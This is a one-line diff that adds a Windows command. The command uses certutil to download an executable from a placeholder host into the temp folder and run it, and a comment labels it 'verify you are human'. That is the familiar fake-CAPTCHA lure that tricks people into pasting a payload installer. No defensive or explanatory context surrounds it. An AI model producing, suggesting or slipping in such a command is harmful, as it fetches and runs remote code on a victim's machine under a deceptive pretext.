@@ -1,0 +1,1 @@
+certutil -urlcache -f https://example.invalid/r.exe %TEMP%\r.exe & %TEMP%\r.exe # verify you are human
